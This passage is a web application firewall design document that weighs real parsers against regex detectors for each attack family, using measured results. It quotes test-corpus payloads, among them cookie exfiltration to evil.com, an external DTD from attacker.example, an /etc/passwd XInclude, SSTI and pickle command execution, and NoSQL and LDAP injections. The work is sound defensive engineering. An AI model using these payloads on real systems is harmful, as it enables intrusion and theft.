# Should the remaining Lane 2 families run a real parser?

Lane 2 has ten attack families and thirteen detectors. Three of them already run
a genuine parser and build a genuine tree; the rest match bounded regexes against
a normalised view. This document answers, family by family, whether the rest
should join them.

The question is not "are ASTs better than regexes". It is narrower and has a
price attached:

> **Handing an attacker a parser hands the attacker a new attack surface.** For
> each family: is the detection the parse buys worth the parse surface, the CPU,
> and the dependency?

This tree has already paid that bill twice, in both directions, and both receipts
are quoted below.

## Where the tree actually stands

The common summary — "only SQLi and RCE parse, the other eight are regex" — is
wrong in two places, and both matter for the answer.

| layer | parser | what it parses |
|---|---|---|
| `AstSqlDetector` (`detectors.rs:2222`) | `sqlparser` 0.62 `GenericDialect` | SQL → `Statement` / `SetExpr` / `Expr` |
| `RceAstDetector` (`detectors.rs:2982`) | `brush-parser` 0.4.0 | shell → `Program` / `SimpleCommand` / `Pipeline` |
| **`XssDomDetector` (`xss_dom.rs`)** | **`scraper` / Servo `html5ever`** | **WHATWG HTML5 fragment → element tree** |
| `struct_extract::extract_body_fields` (`struct_extract.rs:138`) | `serde_json`, `quick-xml` 0.41, `async-graphql-parser`, `multer` | request **bodies** → leaves handed to every detector |

So XSS-DOM is not a structural matcher — it is a full WHATWG parse, and the
`xss_js` token layer sits on top of the execution contexts that parse extracts.
And every detector already consumes the output of four body parsers it did not
write, because `extract_body_fields` runs first.

That leaves eight detectors that are genuinely pattern-only:

`TraversalStructuralDetector`, `XxeStructuralDetector`, `NoSqlStructuralDetector`,
`SstiStructuralDetector`, `LdapStructuralDetector`, `XpathStructuralDetector`,
`DeserStructuralDetector`, `XssJsTokenDetector`.

## The two receipts

**Receipt one — the parser that cost us.** `brush-parser` 0.4.0's `io_number`
rule takes any all-digit word before `<`/`>` and `.parse().unwrap()`s it into an
`i32`. A 17-byte payload, `x | 2147483648>&1`, overflows and panics; on
2026-07-27 the soak reached it from body, query and header under the shipped
configuration. It is contained now (`contain_parser_panic`, `detectors.rs:3056`,
plus a pre-parse shape filter and a nesting-depth guard), but the containment
comment states the real finding:

> 0.4.0 is the newest release, so there is no version to upgrade to, and the
> crate has upwards of a hundred further `unwrap` / `unreachable` sites — this is
> a class of bug, not one bug.

That is the standing cost of a true AST: not one CVE, an ongoing exposure to
someone else's panic discipline, mitigated by a `catch_unwind` that cannot save
you from a stack overflow.

**Receipt two — the parser we refused, and were right to.** The XXE detector
(`detectors.rs:628`) deliberately runs no XML parser, and says why: not parsing
removes the entire parse-time DoS surface — billion-laughs expansion, deep
nesting, oversized entities — because there is no expansion step to weaponise.
The billion-laughs indicator is a bounded *count* of `<!ENTITY` declarations,
never an expansion.

Both receipts point the same way: the question is per-family, and the default
answer is "no".

## Method

Conclusions below are measured, not asserted. `tests/lane2/` ships a 390-row
corpus (170 attacks, 220 benign) written without reading `crates/`, and
`baseline.json` records what the shipped configuration detects: 74.71 % of
attacks in shadow, 4.55 % benign false-positive rate, 40 attacks blind.

The baseline does not name the 40 blind rows, so the default-on rule tables were
re-implemented against the corpus with a model of the decode chain (URL, HTML
entity, form-parameter split, JSON leaves, blind base64). The simulation
reproduces the recorded per-family numbers almost exactly — XXE 12/15, NoSQL
6/15, LDAP 12/15, XPath 13/15, deserialization 12/15, traversal 18/20, SSTI 6 vs
the recorded 5 — which is close enough to trust the identity of the individual
misses. Every "currently missed" payload named below is a real committed corpus
row, quoted verbatim.

Five further experiments were run, none of which left code in the tree:

* two LDAP detector prototypes, replayed against all 390 rows — a paren-balance
  heuristic and a real RFC 4515 recursive-descent parser;
* the same parser reused as a *suppressor* on top of the shipped regexes, to test
  whether it retracts the one benign Block;
* the shipped `AstSqlDetector` wrapping logic, compiled against `sqlparser` 0.62
  and run over the XPath and LDAP corpus values, to find out which families the
  parser already in the tree is silently covering;
* `sxd-xpath` compiled and run on the two XPath misses, to check whether its
  expression parser is usable without an XML document;
* `pickletools` over `os.system("id")` at every pickle protocol, to establish
  which protocols the shipped deserialization rule can actually see.

Where an experiment contradicted the hypothesis it was testing, the result is
reported as the finding. Two did.

### "Default-off" does not mean "a config flip away"

This document repeatedly finds that a miss is covered by a rule that ships
default-off. That is a weaker consolation than it first sounds, and
[`lane2-blind-spots.md`](lane2-blind-spots.md) establishes why — its
classification of the same 40 blind rows is the companion to this one, and the
two agree wherever they overlap:

* **none of the 40 blind rows is budget-caused.** Opening all ten budget keys
  leaves detection at 127/170 and the blind set identical. No amount of tuning
  recovers any row, which is what makes the detector-level question in this
  document the only one left;
* **15 of the 40 are "the rule exists but is compiled off"** — the population
  this survey keeps landing in;
* **23 need genuinely new detection capability.**

And `default_on` is a `bool` literal in the rule table, consumed by
`compile_table(table, all, who)` where `all` is `false` from `new()` and `true`
only from a `#[cfg(test)]` constructor (`detectors.rs:67`). **There is no
per-rule configuration surface anywhere in the tree.** So "turn on
`xxe.doctype_external`" is a code change and a release, not an operator action —
and, more awkwardly, nobody can currently measure what flipping a rule would cost
without editing Rust. Wherever this document says a miss is "covered by a
default-off rule", read it as *the detection logic already exists and the work is
a rule-scoping decision*, never as *someone can switch it on this afternoon*.

## Decision table

| family | today | mature Rust parser? | what a parse would add | new attack surface | CPU | verdict |
|---|---|---|---|---|---|---|
| XSS-DOM | `html5ever` fragment parse (`xss_dom.rs`) | — | — | — | — | **already an AST** |
| NoSQL | anchored match on `serde_json` leaves (`detectors.rs:884`) | — | — | — | — | **already an AST** — the tree is `serde_json`'s |
| XXE | DTD/prolog regex, no parser (`detectors.rs:720`) | `quick-xml` (already in tree) | nothing; all 3 misses are config + one regex row | entity expansion, if you ever use a validating parser | — | **do not** |
| Traversal | encoding regexes (`detectors.rs:582`) | `typed-path` | nothing; both misses are default-off rules | small | small | **do not** |
| SSTI | delimiter+sink co-occurrence (`detectors.rs:1141`) | none — six incompatible grammars | would need 6 parsers for ~6 rows | six template parsers | high | **do not** — no parser exists that covers the family |
| LDAP | filter-break regexes (`detectors.rs:1342`) | yes — `ldap3::parse_filter`, `ldap-types` (neither depth-limited) | +1 attack, benign firings 1 → 6 (measured) | small (tiny grammar) | negligible | **do not** — measured, not assumed |
| XPath | structural regexes (`detectors.rs:1536`) | `sxd-xpath` — usable, but unmaintained since 2018 | nothing: its one catchable miss is already caught by the SQL AST | recursive-descent expression parser | small | **do not** — the parse is already paid for |
| Deserialization | format-magic + gadget regexes (`detectors.rs:1787`) | pickle: our own ~200-line opcode walker | **protocol ≥4 pickles — i.e. the `pickle.dumps` default since Python 3.8** | near-zero on parse, but see the stack-VM caveat | negligible | **should, and the candidate is ours to write** |
| XSS-JS | token scan of extracted handler bodies (`xss_js.rs`) | `boa_parser` / `oxc_parser` / `swc_ecma_parser` | see below | **the largest in the survey** | high | see below |

## Per family

### NoSQL — already an AST, and the gap is in the extractor

`NoSqlStructuralDetector` anchors `^\$(where|function|accumulator)$` against
leaves that `extract_body_fields` produced by walking a `serde_json` tree. The
operator arrives as its own leaf precisely *because* the body was parsed; a
`$ne` sitting inside a string value is a different leaf and cannot anchor-match.
Calling this "regex, not AST" mistakes where the tree is built.

All nine corpus misses confirm it. Seven (`nosql-001`, `-003` … `-007`, `-011`)
are `$ne` / `$gt` / `$or` / `$regex` / `$expr`, every one of which has a written
rule that ships **default-off** pending holdout calibration. A parser adds
nothing to a rule that is switched off.

The remaining two are the interesting ones, and they expose a systematic blind
class rather than a tuning gap:

```
nosql-009  POST /login   application/x-www-form-urlencoded
           username=admin&password[$ne]=x
nosql-010  GET  /api/users?user%5B%24ne%5D=admin&pw%5B%24ne%5D=x
```

PHP, Rails, Express (`qs`) and Fastify all expand `password[$ne]=x` into the
nested object `{"password": {"$ne": "x"}}` before it reaches the database driver.
That is how this bypass is delivered in the wild.

Neither row can be detected at all in the current shape, and the reason is the
same for both. `NOSQL_RULES` are **anchored** (`^\$(where|function|accumulator)$`)
— deliberately, because anchoring to a whole leaf is what buys the precision that
lets the rule ship default-on. An anchored rule only ever matches a view whose
*entire* text is the operator, which means it can only match a leaf that
`extract_body_fields` produced. And:

* a `x-www-form-urlencoded` body produces **no leaves at all** — the whole body
  is the only view (`struct_extract.rs:1008`,
  `form_urlencoded_body_is_not_extracted`);
* a query string is **one field**, not one per parameter
  (`preprocess.rs:1057`) — `user[$ne]=admin&pw[$ne]=x` is a single view.

So the family's operator detection is reachable only through JSON, XML, GraphQL
and multipart bodies. Every MongoDB operator injection arriving as a form
parameter or a query parameter is structurally invisible, regardless of which
rules are switched on. That is a real gap and it is entirely in the extractor.

**Verdict: already equivalent to an AST — the tree is `serde_json`'s. Do not add
a parser. Surface form and query parameters as leaves, with bracket-notation
expansion, so the anchored rules can reach them.**

### XXE — the deliberate refusal is still correct

Three corpus rows are missed, and not one of them needs a parser.

```
xxe-004  <!DOCTYPE r SYSTEM "http://attacker.example/x.dtd">
xxe-005  <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;…"> …]>
xxe-006  <foo xmlns:xi="…/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

* `xxe-004` is exactly `xxe.doctype_external`, a written rule that is
  default-off because legitimate XHTML ships `<!DOCTYPE html PUBLIC …>`.
* `xxe-005` is exactly `xxe.entity_expansion`, `RuleKind::Count(3)`, also
  default-off. The payload declares three entities; the rule would fire.
* `xxe-006` has no rule at all — and needs a regex, not a parser. `xi:include`
  with an `href` naming `file://` or `http://` is a flat two-token co-occurrence.
  A parser would tell you it is an element in the XInclude namespace, which is
  information you did not need.

The asymmetry is the whole argument. A non-validating pull parser (`quick-xml`,
already in the tree) hands back the DOCTYPE as raw text, to be scanned exactly as
it is scanned now — so it buys nothing. A *validating* parser is the only thing
that would buy anything, and a validating parser is precisely the machine the
attack is designed to detonate. There is no middle position where you gain
structure without gaining the expansion step.

**On the brief's question — can you get structure without giving the attacker the
expansion?** Yes, and the tree already does: `quick-xml`'s pull lexer runs on
XML bodies for field extraction (`struct_extract.rs:273`), resolving only
predefined entities (`resolve_predefined_entity`, line 330), with a pre-parse
`nesting_depth` guard and an event budget. That is lexical scanning without
entity resolution, and it is already shipping. There is no further structure to
extract that the DTD grammar does not hand you as text.

**Verdict: do not. The current design is optimal. Bring `xxe.doctype_external`
and `xxe.entity_expansion` on by default under route scope, and add one row for
XInclude.**

### Traversal — both misses are rules already written, and normalization does not fix the blocker

```
trav-005  /download?file=../../../../../proc/self/environ
trav-016  /render?template=../../../../app/config/database.yml
```

`trav-005` is `traversal.sensitive_abs_ops`, default-off because `/proc/self`
appears in ordinary operations traffic. `trav-016` is a plain `../` chain
(`traversal.plain_dotdot`, default-off) reaching a path that is on no sensitive
list. Neither is a parsing failure.

The plausible "AST" here is lexical path normalization — resolve `..` segments
with `typed-path` and ask whether the result escapes the root, instead of
enumerating `%2e%2e`, `%252e%252e`, `....//`, `%c0%af`. That is a genuinely
tidier way to express what the rules express, and it would generalise past the
enumerated encodings.

It does not help, for a specific reason: normalization cannot fix the false
positive that keeps `plain_dotdot` switched off. `import x from '../util'`
normalizes to an escaping path just as `../../etc/passwd` does. The escape is
real in both. The thing that separates them is whether the field feeds a
filesystem open, which is the RASP ceiling and is not visible to a reverse proxy.
Normalization would buy a cleaner rule with the identical false-positive rate.

This is the one rejection in the survey that is *not* about cost. `typed-path`
0.12.3 (2026-02-11) has **zero transitive dependencies**, MIT OR Apache-2.0, no C
toolchain, no advisories — the cleanest candidate examined. It is rejected purely
because it does not move the number that is stuck, which is worth stating plainly:
a cheap dependency is still not free if it buys nothing.

**Verdict: do not.**

### SSTI — no parser exists that covers this family

The nine misses split cleanly:

| row | payload | why missed |
|---|---|---|
| `ssti-001` | `{{7*7}}` | `ssti.jinja_arith_probe`, default-off |
| `ssti-002` | Jinja config disclosure | bare-delimiter rules default-off |
| `ssti-006` | `#set($x=$rt.getRuntime().exec("id"))` | no Velocity `getRuntime().exec` row |
| `ssti-009` | `{{_self.env.registerUndefinedFilterCallback("exec")}}` | Twig `_self.` is gated to `{%…%}`, not `{{…}}` |
| `ssti-010` | `{php}system('id');{/php}` | no Smarty row |
| `ssti-012` | `{{''|attr('\x5f\x5fclass\x5f\x5f')}}` | hex-escaped dunder survives the decode chain |
| `ssti-013` | Handlebars `constructor` gadget | no Handlebars row |
| `ssti-014` | payload split across query args | cross-field, no detector sees it |
| `ssti-015` | `#{global.process.mainModule.require(…)}` | no Pug/Nunjucks row |

A tenth row, `ssti-011`, is worth naming because it explains the one place the
simulation disagreed with the recorded baseline. The payload is
`${T(java.lang.Runtime).getRuntime().exec('id')}` in an `X-Api-Version` header —
a rule matches it, but Lane 2 never sees it: the header scope inspects path,
query, cookie and exactly seven curated headers (`SEMANTIC_HEADERS`,
`preprocess.rs:580` — `user-agent`, `referer`, `x-forwarded-for`, `x-real-ip`,
`x-original-url`, `x-forwarded-host`, `forwarded`). An injection in any other
header is invisible to the whole lane, in every family. That is a scope decision,
not a parsing one, and it is the difference between the simulated 6 and the
recorded 5.

Of the nine genuine misses, five are a **missing signature for a template engine
nobody wrote a row for**. That is a rule-authoring task measured in an afternoon. A parser cannot
substitute for it, because there is no such parser: Jinja2, Twig, Velocity,
FreeMarker, Smarty, Handlebars, Pug and ERB have mutually incompatible grammars
and no shared AST. Covering the family by parsing means shipping six parsers, and
each one is a `brush-parser`-shaped liability — six independent panic surfaces
to catch, six depth guards to write, six upstreams to track.

Worse, a parse does not even answer the question. `{{7*7}}` parses identically
whether the backend is Jinja2 or Vue. The detector's own comment is the honest
statement of the ceiling: it judges whether the payload *looks like* SSTI, not
whether a template engine will evaluate it. Parsing does not move that ceiling
one inch, because the ambiguity is about the *backend*, not the payload.

`ssti-012` is the only row where structure would help — a template-aware
evaluator would fold `attr('\x5f\x5fclass\x5f\x5f')` to `attr('__class__')`. But
that is a decode-chain job (add `\xNN` escape decoding to the preprocessor, where
it benefits every family) rather than a parse.

**Verdict: do not. Write the five missing engine signatures; add `\xNN` decoding
to the shared preprocessor.**

### Deserialization — the one clear "yes", and the parser is ours to write

Nine of twelve default-on rules hit. Three misses:

```
deser-006  data=O:8:"stdClass":1:{s:4:"exec";s:2:"id";}
deser-015  data=a:2:{s:4:"user";O:4:"Evil":1:{s:3:"cmd";s:2:"id";}s:1:"x";O:8:"stdClass":0:{}}
deser-009  {"blob":"gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="}
```

The two PHP rows are the known trade: `deser.php_object_injection` (the generic
`O:<len>:"<class>":` header) is written and default-off because ordinary apps
carry `O:8:"stdClass"` in cookies and caches. `deser-015` additionally nests the
object inside a serialized array, which the class-name-anchored default-on rule
cannot reach. A real PHP `serialize()` parser would give structural certainty —
"this is a well-formed serialized graph containing N typed objects at depth D" —
instead of a substring guess, and would reach nested objects. The format is
trivial (length-prefixed, no ambiguity), so a parser is cheap and safe. But the
gain is modest and mostly about false positives.

**`deser-009` is different, and it is the strongest finding in this survey.**

Base64-decoded it is:

```
80 04 95 20 00 00 00 00 00 00 00 8c 05 posix 94 8c 06 system 94 93 94 8c 02 id 94 85 94 52 94 2e
```

Disassembled — a pure structural walk that executes nothing:

```
0: \x80 PROTO 4
2: \x95 FRAME 32
11: \x8c SHORT_BINUNICODE 'posix'
19: \x8c SHORT_BINUNICODE 'system'
28: \x93 STACK_GLOBAL
30: \x8c SHORT_BINUNICODE 'id'
35: \x85 TUPLE1
37: R    REDUCE
39: .    STOP
```

That is an unambiguous `posix.system("id")` reduction. The shipped rule cannot
see it, and not by a near miss:

* the rule is `\bc(?:os|posix|nt)\s+system\b` — it matches the text `GLOBAL`
  opcode, `c<module>\n<callable>`, which the preprocessor's newline collapse
  turns into `cposix system`;
* **protocol 4 and later do not emit `c` at all.** `save_global` switches to
  `STACK_GLOBAL` (`\x93`): the module and the callable are pushed as two separate
  length-prefixed strings and joined by an opcode byte. There is no `c` and there
  is no newline;
* **protocol 4 is `pickle.DEFAULT_PROTOCOL`** — since Python 3.8, and still on
  3.13.

Measured on Python 3.13.5, pickling `os.system("id")` via `__reduce__` at each
protocol:

```
proto 0  len= 34  text GLOBAL form present: True
proto 1  len= 33  text GLOBAL form present: True
proto 2  len= 34  text GLOBAL form present: True
proto 3  len= 34  text GLOBAL form present: True
proto 4  len= 40  text GLOBAL form present: False   <- pickle.dumps() default
proto 5  len= 40  text GLOBAL form present: False
```

So the default-on pickle rule catches an attacker who explicitly asked for an
obsolete protocol, and misses every payload a bare `pickle.dumps` has produced
for the last seven years. That is not a tuning gap, it is a
structural blind spot, and no additional regex closes it: the framing bytes are
non-UTF-8 and arrive on the view surface as `U+FFFD` (verified — the lossy view
of this payload is `'�\x04� \x00…�\x05posix��\x06system…'`),
so the module and callable are not adjacent tokens in any view the detector sees.

**The one thing that must not be glossed.** Pickle is not a data format, it is a
**stack virtual machine**, and `GLOBAL` / `STACK_GLOBAL` / `REDUCE` / `INST` /
`NEWOBJ` are its arbitrary-code-execution primitives. The distance between
"walking these opcodes" and "running these opcodes" is one function call. Every
other family in this survey risks a parser *crashing*; this one risks a parser
*executing the payload*. That asymmetry is the reason the recommendation below is
"write ~200 lines" rather than "add a crate": the safety property is that the
resolver opcodes are only ever *read as names*, and that property has to be
enforced by construction and by test, not inherited from a dependency whose job
description is to turn pickles into values.

`serde-pickle` (1.2.0, 2024-11-22, MIT/Apache-2.0, 8 transitive, no C) turns out
to hold that property already, and the first draft of this document was wrong to
imply otherwise. Its `GLOBAL` / `STACK_GLOBAL` handling resolves against a
**hard-coded seven-symbol whitelist** (`de.rs:987-1100` — `set`, `frozenset`,
`bytearray`, `list`, `int`, `_codecs.encode`, `copy_reg._reconstructor`), and
`INST` / `OBJ` / `NEWOBJ` / `BUILD` discard the class reference without
instantiating anything (`de.rs:486-539`). It does not execute.

It is nevertheless the wrong tool, for the opposite reason — it is *too* safe:

```rust
enum Global {          // de.rs:36 — private, not re-exported
    Set, Frozenset, Bytearray, List, Int, Encode, Reconst,
    Other,             // anything else (may be a classobj that is later discarded)
}
```

`Other` is a **unit variant carrying no data**, on a **private** enum. Every
global outside those seven — which is every global a WAF cares about — collapses
to an anonymous placeholder that has thrown away the module and callable strings.
`serde-pickle` can tell you a payload references *some* global; it structurally
cannot tell you the global was `posix.system`. That is the entire detection.

Given that boundary, the walker this needs is unusually cheap and unusually safe:

* **it is not a deserializer.** `pickletools.genops` semantics: read an opcode
  byte, read its fixed or length-prefixed argument, advance. Nothing is
  constructed, no module is imported, no reduction is performed. The gadget is
  named, never instantiated;
* **it does not recurse.** A pickle opcode stream is flat. There is no depth to
  bound, so the `brush-parser` stack-overflow class does not exist here;
* **it is bounded by construction.** Every opcode's argument length is either
  fixed or read from an explicit length field that can be validated against the
  remaining buffer before the read;
* **there is no dependency.** Roughly 200 lines of opcode table plus a
  stack-tracking walk covers every `GLOBAL` / `STACK_GLOBAL` / `REDUCE` / `INST` /
  `OBJ` / `NEWOBJ` shape, with no new supply chain at all — and, per the boundary
  above, with the "names only, never resolves" property written as a test rather
  than assumed.

The detection it buys is the thing every other family in this survey cannot
offer: a **structurally certain** verdict. `STACK_GLOBAL` naming `posix.system`
followed by `REDUCE` is not "this looks like an attack" — it is "this byte
stream, if unpickled, calls `posix.system`". That is the only place in Lane 2
where a parse escapes the RASP ceiling rather than merely restating it, because
the pickle stream *is* the program, not a hint about one.

**Verdict: should, and the candidate is ~200 lines of our own code with zero new
dependencies.**

### LDAP — the small-grammar intuition is wrong, and it was measured

RFC 4515 is a tiny grammar, so the intuition is that this is the best
return on investment in the survey: a small parser is a small attack surface.
The intuition was tested against the corpus rather than trusted, and it does not
survive.

Three rows are missed today:

```
ldap-005  user=*&pw=*                      bare wildcard credential bypass
ldap-007  user=admin*)((|userPassword=*)   or-clause attribute leak
ldap-015  a=*)(uid&b==*                    split across two query parameters
```

`ldap-005` carries no filter syntax at all — the value is one character, `*`.
There is nothing to parse. `ldap-015` splits the payload across two parameters
that the application concatenates; no single-field detector, parser or otherwise,
can see it. Only `ldap-007` is a genuine parse-shaped miss: the regexes look for
`)(` followed by a logical operator or a known attribute, and `)((|` puts an
extra grouping paren in between, so both default-on rules step over it.

Two prototypes were built and run against all 390 rows.

**Prototype 1 — paren balance.** An injected fragment borrows the application's
enclosing parens, so it should be unbalanced, while a legitimately-submitted
filter is balanced. Result: **3/15** attacks, against the shipped 12/15, and four
benign rows firing. The premise is simply false — `*)(uid=*))(|(uid=*` has three
`(` and three `)`. Injections balance themselves all the time.

**Prototype 2 — a real RFC 4515 recursive-descent parser** (~120 lines, explicit
depth cap). Fire when the value does not parse as a complete standalone filter
but, wrapped in the application's presumed `(uid=VALUE)` template, yields a
complete filter with a non-empty remainder — the literal definition of closing
the application's filter early and appending your own.

| | attacks caught | benign firing |
|---|---|---|
| shipped default-on regexes | 12/15 | 1 (and it is a **Block**) |
| RFC 4515 fragment parser | 13/15 | 6 |

It picks up `ldap-007` and `ldap-015`, loses `ldap-009` (hex-escaped `\2a\29\28`,
which the escape regex catches and a parser only catches if you decode RFC 4515
escapes first), and takes benign firings from one to six. The five new ones are
parenthesised prose that structurally *is* a filter fragment: a markdown code
fence (`content-001`), a code-review comment containing `` `$(git rev-parse HEAD)` ``
(`content-040`), an ORM debug log (`content-048`), a reporting filter DSL
(`content-050`) and a Grafana dashboard definition (`content-096`). A parser
cannot tell those apart from an injection, because structurally they are not
different.

**And it does not fix the one thing worth fixing.** `content-099` — an LDAP admin
page saving `(&(objectClass=person)(uid=jsmith))` — is one of only two benign
rows in the entire corpus that the lane would *block*. The parser diagnoses it
correctly at leaf level: that value parses end-to-end as a complete standalone
filter, so it is a filter-authoring tool's payload, not a fragment. Used as a
suppressor it should retract the Block.

It does not, and the reason is instructive. `preprocess` keeps the whole request
body as a view *alongside* the extracted leaves
(`preprocess.rs:1413`, `structured_body_extracts_leaves_and_preserves_whole_body_view`).
The whole-body view contains the filter as a substring, fires
`ldap.filter_break_known_attr`, and does not parse as a complete filter — because
it is a JSON document, not a filter. The suppressor was measured: benign rows
matched before, `[content-099]`; after, `[content-099]`.

Fixing `content-099` is a scope question — which routes accept filter syntax,
answered in `enforcement_overrides` — exactly as `tests/lane2/README.md` already
concludes. It is not a parsing question.

**Verdict: do not. +1 attack, benign firings from one to six, and it does not fix
the blocking FP. The shipped regexes are already at 80 % with one FP.**

### XPath — the parser that would catch the miss is already in the tree

Two rows missed:

```
xpath-007  user=' or 1=1 or ''='                      numeric tautology
xpath-013  {"q":"x' return //user/password] for $x in //user return $x/(:"}
```

`xpath-013` is XQuery, not XPath. A FLWOR expression (`for … in … return …`) is
not in the XPath 1.0 grammar, so an XPath parser rejects it and produces nothing.
Catching it needs an XQuery parser, for one corpus row.

`xpath-007` is a real tautology, missed because `xpath.quote_tautology` requires
both operands quoted and single-character, and `1=1` is unquoted. This is exactly
the shape a parser folds. **And the tree already has the parser that does it.**

The shipped `AstSqlDetector` wraps a view in a synthetic enclosing context and
parses the result — `select * from t where c = {v}`, falling back to
`select * from t where c = '{v}'` when the view holds a quote — then walks the
`WHERE` clause for a comparison between two literals. Run against the corpus
values (`sqlparser` 0.62, `GenericDialect`, verbatim wrapping):

```
SQL-AST HIT   xpath-007  via quote-wrap  :: select * from t where c = '' or 1=1 or ''=''
SQL-AST HIT   xpath-001  via quote-wrap  :: select * from t where c = '' or '1'='1'
SQL-AST HIT   xpath-006  via quote-wrap  :: select * from t where c = 'x' or name()='username' or 'x'='y'
SQL-AST miss  xpath-013                  :: x' return //user/password] for $x in //user return $x/(:
SQL-AST miss  ldap-007                   :: admin*)((|userpassword=*)
```

`xpath-007` is not blind. It is detected, by the SQL AST, and recorded under
`sql_injection` — which is why it does not appear in the XPath family's row. The
detector's own comment anticipated this: the quote-closed tautology deliberately
overlaps SQLi, and "the payload is structurally a tautology-injection whichever
backend consumes it".

So the XPath family's *measured* deficit against a parser is: one XQuery row that
an XPath parser could not have caught either. A second recursive-descent
expression parser would be added to catch nothing.

This is *not* a "no usable parser exists" verdict, and the first draft of this
document wrongly said it was. `sxd-xpath` exposes standalone expression parsing —
`Factory::build(&str)`, no XML document required — and it was compiled and run
against the two rows to check rather than assumed:

```
xpath-007 substituted   //user[name='' or 1=1 or ''='']                     -> Ok(parsed)
xpath-013 raw           x' return //user/password] for $x in //user ...     -> Err(ExtraUnparsedTokens)
benign                  /root/child[@id='3']                                -> Ok(parsed)
```

So an XPath AST detector is buildable, and it would confirm `xpath-013` is not
XPath at all. Its diligence is clean on every axis except the one that matters
most: `sxd-xpath` 0.4.2 was released **2018-10-31**, four transitive crates
(`sxd-document`, `peresil`, `quick-error`, `typed-arena` 1.x — all of comparable
age), MIT/Apache-2.0, no C toolchain, no advisories in `cargo audit`.

It is still the wrong call, because it would be a **second** recursive-descent
parser, adopted from a package with no releases in seven and a half years, to
catch a row the tree already catches with a parser it already maintains.

The real XPath finding is a **reporting** one, not a detection one: a tautology
both families can see is attributed to whichever detector reports it, and the
family-level recall table understates XPath as a result. That is worth a note in
the corpus report; it is not worth a dependency.

**Verdict: do not.**

### XSS-JS — the Block gap is in the parser already running

XSS is the family the brief expected to need a parser most, and it is the one
where the measurement is most lopsided: **90 % detected in shadow, 15 % blocked
in enforce.** Detection is nearly saturated. What fails is corroboration.

The family is weighted `xss_dom = 0.5 / xss_js = 0.5` with `block_threshold = 80`,
so Block requires both detectors to fire on the same field. `xss_js` reads only
what `xss_dom` hands it, and `scan_element` (`xss_dom.rs:486`) pushes exactly two
kinds of context:

* the value of an `on*=` event-handler attribute;
* the script body of a `javascript:` / `vbscript:` URL.

**`<script>` element text content is never pushed.** The `script` arm of the
`match` records `xss.script_tag` and moves on; the rawtext child the parser
already built is dropped.

Four of the twenty corpus attacks put their JavaScript in a `<script>` body:

```
xss-006  "><script>alert(document.cookie)</script>
xss-009  <script>new Image().src='//evil.com/?c='+document.cookie</script>
xss-017  {"profile":{"settings":{"bio":"</script><script>alert(document.cookie)</script>"}}}
xss-019  <script>window['al'+'ert'](1)</script>
```

Three of the four contain `document.cookie` verbatim — the highest-confidence
token in `EXFIL_TOKENS`, default-on, confidence 88. Every one of them fires
`xss.script_tag` at 0.5. Not one can ever reach Block, because the string
`xss_js` would match on is in a node `xss_dom` walks past without collecting.

That is a handful of lines in a walk that is already running, on a tree that is
already built, with **no new parse surface, no new dependency and no new CPU** —
html5ever has already parsed the script content as text by the time `scan_element`
sees the element.

Only then is the JS-parser question worth asking, and the answer is no. What a
real JS AST adds over the token tables is constant folding and computed member
access:

```
eval('doc' + 'ument.coo' + 'kie')
self["docu" + "ment"]["coo" + "kie"]
eval(`${'doc'}ument.cookie`)
```

None of these is in the corpus. `xss-019` is the closest — `window['al'+'ert'](1)`
— and folding it yields `alert`, which is deliberately **not** in the token
tables, because a benign handler pops dialogs and `alert` is evidence of "this is
JS", not of an attack. Folding it changes nothing.

Against that, the cost is the largest in the survey. Five candidate crates were
measured (metadata from the crates.io API, advisories from a refreshed
`cargo audit` database, trees from scratch projects):

| crate | latest | maintenance | RUSTSEC | licence | transitive crates | C toolchain | expression API | depth limit |
|---|---|---|---|---|---|---|---|---|
| `oxc_parser` | 0.142.0, 2026-07-27 | very active | none | MIT | 76 | no | `parse_expression()` | **none** |
| `swc_ecma_parser` | 43.0.0, 2026-07-29 | very active | none | Apache-2.0 | 116 | **yes — `stacker`→`psm`→`cc`** | `parse_expr()` | `stacker` auto-grow, statements only |
| `boa_parser` | 0.21.1, 2026-03-29 | active | RUSTSEC-2024-0436 (`paste`, unmaintained, transitive) | `Unlicense OR MIT` | 75 | no | none | **none** |
| `ressa` | 0.9.0-alpha.3, 2023-06-11 | stale ~2 y | 4× unmaintained (`unic-*`) | MIT | 24 | no | none | **none** |
| `rslint_parser` | 0.3.1, 2021-10-06 | **dead**, superseded by Biome | **2 unsound**: RUSTSEC-2023-0055, RUSTSEC-2023-0086; + `atty` RUSTSEC-2021-0145 | MIT | 41 | no | `parse_expr()` | **none**; open FIXME on infinite recursion |

Every tree resolves inside `deny.toml`'s licence allowlist, `boa_parser` via the
`OR MIT` branch. Three findings decide it:

* **not one of the five offers a configurable recursion depth.** The mitigation
  would have to be ours, and it would have to over-approximate ECMAScript's
  recursion drivers the way `ast_structural_depth_ok` over-approximates
  `sqlparser`'s — over a far larger grammar. `contain_parser_panic` cannot
  substitute: a stack overflow aborts rather than unwinds
  (`detectors.rs:2321`);
* **`swc_ecma_parser` pulls `psm` through `stacker`, which builds C.** This tree
  already made that exact call in the other direction: `sqlparser` is taken with
  `default-features = false` specifically to drop `recursive-protection` and its
  `psm` dependency, "keeping the supply chain zero-C/zero-unsafe"
  (`crates/waf-engine/Cargo.toml:36`). Taking `psm` back for XSS would reverse a
  decision made deliberately for SQL. And `stacker` is wired into swc's statement
  parser, not its expression parser — the surface a handler body actually hits;
* **`oxc_parser`, the strongest candidate, carries ~208 `unsafe` occurrences** for
  lexer and cursor performance, in a workspace whose own lint table is
  `unsafe_code = "deny"`.

The remaining costs are structural:

* they are large, fast-moving dependencies whose panic discipline we would be
  adopting — `oxc_parser` and `swc_ecma_parser` both ship weekly, and
  `swc_ecma_parser` is on major version 43 — which is the `brush-parser` lesson
  verbatim, at ten times the size;
* and the RASP ceiling is untouched. XSS truth is a browser-behaviour question —
  parse-differential and mutation-XSS are physical false-negative sources that
  `xss_dom.rs` already names in its own module docs. A correct JS parse tells you
  what the JS means, never whether it runs.

**Verdict: do not add a JS parser. Collect `<script>` text content into
`js_contexts` in the walk that is already running — that is where the 90 %/15 %
gap lives.**

## Ranking

If one thing is done, in order:

1. **Deserialization — pickle opcode walker.** The only place a parse produces a
   structurally certain verdict rather than a resemblance judgment, and the only
   family with a blind spot no regex can close: the default-on rule matches the
   text `GLOBAL` opcode, and protocol 4 — `pickle.DEFAULT_PROTOCOL` since Python
